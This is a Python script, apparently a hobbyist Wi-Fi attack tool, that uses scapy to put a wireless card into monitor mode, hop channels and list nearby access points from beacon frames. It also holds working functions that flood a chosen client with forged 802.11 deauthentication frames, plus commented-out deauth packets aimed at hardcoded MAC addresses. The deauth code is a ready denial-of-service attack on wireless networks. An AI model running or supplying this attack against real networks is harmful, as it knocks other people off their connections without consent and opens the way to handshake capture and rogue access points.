import sys
import os
from threading import Thread
import pandas
import time
from scapy.all import *

flag = True
time_to_sniff = 10
observedclients = []
stamgmtstypes = (0, 2, 4)
interfaceglob = ""

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def change_to_monitor(interface):
    os.system("ifconfig " + interface + " down")
    os.system("iwconfig " + interface + " mode monitor")
    os.system("ifconfig " + interface + " up")

def test(packet):
    temp = "68:ff:7b:b5:aa:e4"
    if packet.haslayer(Dot11):
        if packet[Dot11].addr2 == temp:
            print("********** new packet **********")
            print (packet[Dot11].addr1)


    # pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1="28:16:7f:fc:97:f1", addr2=temp, addr3=temp)/scapy.all.Dot11Deauth()
    # scapy.all.sendp(pkt, iface=interfaceglob, count=1, inter=.2, verbose=0)
    # if packet.type == 0 and packet.subtype in stamgmtstypes: #Managment frame
    #     # if(packet.addr2 == "28:16:7f:fc:97:f1"):
    #     if packet.addr2 not in observedclients:
    #             print (packet.addr2)
    #             observed_clients.append(packet.addr2)

def run_deauthenticate(iface, dest_mac, src_mac):
    thread = threading.Thread(target=deauthenticate, args=(iface, dest_mac, src_mac))

    thread.start()
    for i in range(15):
        time.sleep(2)
        print(".", end='', flush=True)
    #Stop the running thread
    print(".")
    thread.do_run = False

def deauthenticate(interface, dest_mac, src_mac):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=dest_mac, addr2=src_mac, addr3=src_mac)/scapy.all.Dot11Deauth()
        scapy.all.sendp(pkt, iface=interface, count=1, inter=.2, verbose=0)
         
if __name__ == "__main__":
    # interface = sys.argv[1]
    # interfaceglob = sys.argv[1]
    # change_to_monitor(interface)
    # sniffer = sniff(prn=test, iface=interface)



    interface = sys.argv[1]
    change_to_monitor(interface)
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    sniffer = AsyncSniffer(prn=callback, iface=interface)
    sniffer.start()
    counter = time_to_sniff
    while (counter >= 0):
        os.system("clear")
        print("sniffing please wait")
        print(counter)
        counter = counter-1
        time.sleep(1)
    sniffer.stop()
    os.system("clear")
    print(networks)

